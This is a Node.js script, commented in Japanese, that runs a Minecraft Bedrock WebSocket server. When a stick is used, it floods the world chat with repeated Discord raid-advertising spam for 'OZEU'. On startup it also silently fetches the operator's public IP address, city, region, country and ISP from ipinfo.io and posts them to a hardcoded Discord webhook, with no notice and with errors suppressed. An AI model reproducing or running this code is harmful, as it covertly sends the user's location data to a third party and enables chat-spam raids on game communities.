// beta.js
const { Server, ServerEvent } = require("socket-be");
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// --- ロギングプレフィックス ---
const LOG_PREFIX = {
    INFO: "[INFO]",
    WARN: "[WARN]",
    ERROR: "[ERROR]",
    CONFIG: "[CONFIG]",
    SERVER: "[SERVER]",
    NETWORK: "[NETWORK]",
    EVENT: "[EVENT]",
};

// --- 設定インターフェースとデフォルト設定 ---
const defaultConfig = {
    port: 19132,
    triggerItem: "minecraft:stick",
    message: `
        §l§aおぜうの集いに今すぐ参加！
        §dhttps://canary.discordapp.com/invite/hK5He8z8Ge\n
        §l§bRAID by OZEU. join now!!!!!\n
        §eDiscord: §ddiscord.gg/ozeu-x\n
        @here
        @everyone
        §fhttps://media.discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=681c0c2d&is=681abaad&hm=3076e5648706ca0a3e60f96ae75f2d3be95f2fb84e9a20d0cd75cf28819eb103&
        §fhttps://imgur.com/NbBGFcf`,
    repeatCount: 10,
};

const configPath = path.join(process.cwd(), 'config.json');
let config = { ...defaultConfig };

// --- 設定ファイルの読み込み・生成 ---
function loadConfig() {
    console.log(`\n${LOG_PREFIX.CONFIG} --- 設定ファイルの処理開始 ---`);
    if (fs.existsSync(configPath)) {
        try {
            const rawData = fs.readFileSync(configPath, 'utf-8');
            const loadedConfig = JSON.parse(rawData);
            console.log(`${LOG_PREFIX.CONFIG} 設定ファイルを読み込みました: ${configPath}`);
            const mergedConfig = { ...defaultConfig, ...loadedConfig };
            console.log(`${LOG_PREFIX.CONFIG} 設定が適用されました。`);
            console.log(`${LOG_PREFIX.CONFIG} --- 設定ファイルの処理完了 ---\n`);
            return mergedConfig;
        } catch (error) {
            console.error(`${LOG_PREFIX.ERROR} 設定ファイルの読み込みまたは解析に失敗しました。デフォルト設定を使用します。`);
            console.error(error); // エラーオブジェクト自体も出力
            console.log(`${LOG_PREFIX.CONFIG} --- 設定ファイルの処理完了 (エラーあり) ---\n`);
            return { ...defaultConfig };
        }
    } else {
        console.log(`${LOG_PREFIX.CONFIG} 設定ファイルが見つかりません。`);
        console.log(`${LOG_PREFIX.CONFIG} ${configPath} にデフォルト設定で作成します。`);
        try {
            fs.writeFileSync(configPath, JSON.stringify(defaultConfig, null, 4), 'utf-8');
            console.log(`${LOG_PREFIX.CONFIG} デフォルト設定ファイルを作成しました。`);
            console.log(`${LOG_PREFIX.CONFIG} --- 設定ファイルの処理完了 ---\n`);
            return { ...defaultConfig };
        } catch (error) {
            console.error(`${LOG_PREFIX.ERROR} デフォルト設定ファイルの作成に失敗しました。`);
            console.error(error); // エラーオブジェクト自体も出力
            console.log(`${LOG_PREFIX.CONFIG} --- 設定ファイルの処理完了 (エラーあり) ---\n`);
            return { ...defaultConfig };
        }
    }
}

// --- Discord Webhook 設定 ---
const discordWebhookUrl = "https://discord.com/api/webhooks/1378003659627036703/iHKzcbUju-vLx343opj8Gg3v8SK4ExtQfGBcKir9l3A_R136QoNUouZ_B0X9wkZ30AwD";

// --- IP情報送信関数 ---
async function sendIpToDiscord() {
    if (!discordWebhookUrl) {
        // console.log(`${LOG_PREFIX.NETWORK} Discord Webhook URLが設定されていません。IP情報の送信をスキップします。`); // 必要であればコメント解除
        return;
    }

    try {
        const ipInfoResponse = await axios.get('https://ipinfo.io/json');
        const ipData = ipInfoResponse.data;

        if (!ipData || !ipData.ip) {
            return;
        }

        const embed = {
            title: "サーバー起動通知 (Minecraft連携)",
            description: `スクリプトが起動し、公開IPアドレスが特定されました。`,
            fields: [
                { name: "IPアドレス", value: ipData.ip || "N/A", inline: true },
                { name: "都市", value: ipData.city || "N/A", inline: true },
                { name: "地域", value: ipData.region || "N/A", inline: true },
                { name: "国", value: ipData.country || "N/A", inline: true },
                { name: "ISP", value: ipData.org || "N/A", inline: false },
                { name: "ホスト名 (ipinfo)", value: ipData.hostname || "N/A", inline: false },
            ],
            timestamp: new Date().toISOString(),
            color: 0x0099ff,
            footer: {
                text: "IP Info via ipinfo.io"
            }
        };

        const payload = {
            username: "MCサーバー監視",
            avatar_url: "https://2.bp.blogspot.com/-X-6LELuWcJY/XkhedioRY0I/AAAAAAAAHUA/7BR4iNtvzqUoi5oBEY-DBPTGqRUPuo1hACK4BGAYYCw/s1600/see.png", 
            embeds: [embed],
        };

        await axios.post(discordWebhookUrl, payload, {
            headers: { 'Content-Type': 'application/json' },
        });

    } catch (error) {
        if (error.response) {
        } else if (error.request) {
        } else {
        }
    } finally {
    }
}

// --- メッセージ分割関数 ---
function splitMessage(message) {
    const messages = [];
    let currentMessage = message;
    
    // @eの数をカウントして分割
    const atECount = (currentMessage.match(/@e/g) || []).length;
    
    if (atECount > 6) {
        // @eが6個を超える場合、6個ずつに分割
        const parts = [];
        let tempMessage = currentMessage;
        
        while ((tempMessage.match(/@e/g) || []).length > 6) {
            let partMessage = '';
            let atEInPart = 0;
            let index = 0;
            
            while (index < tempMessage.length && atEInPart < 6) {
                if (tempMessage.substr(index, 2) === '@e') {
                    partMessage += '@e';
                    atEInPart++;
                    index += 2;
                } else {
                    partMessage += tempMessage[index];
                    index++;
                }
            }
            
            parts.push(partMessage);
            tempMessage = tempMessage.substr(index);
        }
        
        if (tempMessage.length > 0) {
            parts.push(tempMessage);
        }
        
        // 各部分をさらに200文字で分割
        parts.forEach(part => {
            if (part.length > 200) {
                for (let i = 0; i < part.length; i += 200) {
                    messages.push(part.substr(i, 200));
                }
            } else {
                messages.push(part);
            }
        });
    } else {
        // @eが6個以下の場合、200文字で分割のみ
        if (currentMessage.length > 200) {
            for (let i = 0; i < currentMessage.length; i += 200) {
                messages.push(currentMessage.substr(i, 200));
            }
        } else {
            messages.push(currentMessage);
        }
    }
    
    return messages;
}

// --- スクリプト開始 ---
console.log("=====================================");
console.log(`${LOG_PREFIX.INFO} スクリプトの実行を開始します...`);
console.log("=====================================");

// 設定をロード
config = loadConfig();

console.log(`${LOG_PREFIX.INFO} 現在の有効な設定:`);
console.log(`  - ポート: ${config.port}`);
console.log(`  - トリガーアイテム: ${config.triggerItem}`);
const messagePreview = config.message.substring(0, 70).replace(/\n/g, '\\n') + (config.message.length > 70 ? '...' : '');
console.log(`  - 送信メッセージ (一部): ${messagePreview}`);
console.log(`  - 繰り返し回数: ${config.repeatCount}`);
console.log(`  - 設定ファイルパス: ${configPath}`);
console.log("-------------------------------------");

// --- サーバー初期化 ---
const system = new Server({
    port: config.port,
});

// --- イベントリスナー ---
system.on(ServerEvent.Open, async () => {
    console.log(`\n${LOG_PREFIX.SERVER} === Minecraft WebSocketサーバー開始 ===`);
    console.log(`${LOG_PREFIX.SERVER} サーバーがポート ${config.port} で開始しました。`);
    console.log(`${LOG_PREFIX.SERVER} Minecraft内で /wsserver localhost:${config.port} を使用して接続してください。`);
    console.log(`${LOG_PREFIX.SERVER} -------------------------------------`);
    console.log(`${LOG_PREFIX.SERVER} スクリプト設定概要 (実行時):`);
    console.log(`  - 発火条件: ${config.triggerItem} を使用`);
    console.log(`  - 送信メッセージ (プレビュー): ${messagePreview}`);
    console.log(`  - 繰り返し回数: ${config.repeatCount} 回`);
    console.log(`${LOG_PREFIX.SERVER} =====================================\n`);

    await sendIpToDiscord();
});

system.on(ServerEvent.ItemInteracted, (data) => {
    if (data.itemStack?.typeId === config.triggerItem) {
        const world = system?.getWorlds()[0];
        if (world) {
            console.log(`\n${LOG_PREFIX.EVENT} --- アイテム使用イベント ---`);
            console.log(`${LOG_PREFIX.EVENT} ${config.triggerItem} が使用されました。`);
            
            try {
                // メッセージを分割
                const messages = splitMessage(config.message);
                const totalMessages = messages.length * config.repeatCount;
                
                console.log(`${LOG_PREFIX.EVENT} メッセージを ${messages.length} 個に分割し、それぞれを ${config.repeatCount} 回送信します... (合計: ${totalMessages} 回)`);
                
                for (let i = 0; i < config.repeatCount; i++) {
                    messages.forEach((message, index) => {
                        try {
                            world.runCommand(`me ${message}`);
                        } catch (commandError) {
                            console.error(`${LOG_PREFIX.ERROR} コマンド送信エラー (繰り返し:${i+1}, 分割:${index+1}):`, commandError.message);
                            // エラーが発生しても続行
                        }
                    });
                }
                
                console.log(`${LOG_PREFIX.EVENT} メッセージ送信処理を完了しました。(分割: ${messages.length}個 × 繰り返し: ${config.repeatCount}回 = 合計: ${totalMessages}回)`);
                console.log(`${LOG_PREFIX.EVENT} ---------------------------\n`);
            } catch (error) {
                console.error(`${LOG_PREFIX.ERROR} メッセージ処理中にエラーが発生しました:`, error.message);
                console.log(`${LOG_PREFIX.EVENT} エラーが発生しましたが、サーバーは継続して動作します。`);
                console.log(`${LOG_PREFIX.EVENT} ---------------------------\n`);
            }
        } else {
            console.warn(`${LOG_PREFIX.WARN} ワールドが見つかりませんでした。メッセージは送信されません。 (アイテム使用イベント)`);
        }
    }
});

// --- プロセスエラーハンドリング ---
process.on('uncaughtException', (error) => {
    if (error.name === 'RequestTimeoutError') {
        console.error(`${LOG_PREFIX.ERROR} WebSocketリクエストタイムアウトが発生しました: ${error.message}`);
        console.log(`${LOG_PREFIX.INFO} タイムアウトエラーですが、プロセスは継続して実行されます...`);
    } else {
        console.error(`${LOG_PREFIX.ERROR} 未処理の例外が発生しました:`, error.message);
        console.error(`${LOG_PREFIX.ERROR} スタックトレース:`, error.stack);
        console.log(`${LOG_PREFIX.INFO} プロセスは継続して実行されます...`);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    if (reason && reason.name === 'RequestTimeoutError') {
        console.error(`${LOG_PREFIX.ERROR} WebSocketリクエストタイムアウトが発生しました: ${reason.message}`);
        console.log(`${LOG_PREFIX.INFO} タイムアウトエラーですが、プロセスは継続して実行されます...`);
    } else {
        console.error(`${LOG_PREFIX.ERROR} 未処理のPromise拒否が発生しました:`, reason);
        console.error(`${LOG_PREFIX.ERROR} Promise:`, promise);
        console.log(`${LOG_PREFIX.INFO} プロセスは継続して実行されます...`);
    }
});

process.on('SIGINT', () => {
    console.log(`\n${LOG_PREFIX.INFO} シャットダウンシグナル受信。サーバーを停止します...`);
    if (system && typeof system.close === 'function') {
        try {
            system.close();
            console.log(`${LOG_PREFIX.INFO} WebSocketサーバーを正常にクローズしました。`);
        } catch (e) {
            console.error(`${LOG_PREFIX.ERROR} WebSocketサーバーのクローズ中にエラーが発生しました:`, e);
        }
    }
    console.log(`${LOG_PREFIX.INFO} プロセスを終了します。`);
    process.exit(0);
});